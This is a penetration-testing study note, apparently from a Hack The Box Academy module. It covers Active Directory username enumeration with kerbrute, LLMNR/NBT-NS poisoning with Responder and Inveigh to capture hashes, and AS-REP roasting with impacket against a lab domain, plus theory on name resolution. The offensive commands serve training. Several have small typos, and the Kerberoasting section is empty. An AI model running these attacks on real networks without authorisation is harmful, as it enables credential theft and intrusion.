#llmnr #nbt-ns #capture #hashcatpure #initialaccess #foothold #firstaccess

>HTB: https://academy.hackthebox.com/beta/module/143/section/1420
# Scan hosts
#### [[AD scan]]

# Username enumeration
> (Internal AD) - brute force active directory accounts 
> wordlist: [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) 

- Use google dorks to *fetch pdfs or documents* by the company to get username. 
- Fetch username from website such as *contact form or team*.
- Metadata: Check the document properties and you may get username structure format (randomly generated GUID). 

#### [[Create custom wordlist]]

#### Generate username combination
```
for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}; do echo $x;done
```
#### User enumeration
```
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc <DC IP> <username_list.txt> -o valid_AD_users
```

---
# LLMNR & NBT-NS poisoning
>Conduct network poisoning and act as a MITM to obtain hashes. This can be done by poisoning LLMNR or NBT-NS for host identification, when DNS fails.
#### Responder (Linux)
```
sudo responder -I ens224
```
```
sudo responder -I ens224 -wfF -v
```
#### Inveigh  (Windows)
>[Inveigh](https://github.com/Kevin-Robertson/Inveigh) 
```
Import module .\Inveight.ps1
```
```
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y -
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
```
```
Inveigh.exe
```

>Metasploit can be used to perform LLMNR & NBT_NS attack.
#### AS-REPROASTING - GetNPUsers
```
impacket-GetNPUsers INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
```
#### Kerberoasting - GetUserSPNs
```

```



---
# Theory
#### LLMNR/NBT-NS poisoning 
- Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port 5355 over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port 137 over UDP. 

*LLMNR/NBT-NS are used for name resolution, any host on the local network can reply, this is where responder comes into play.*
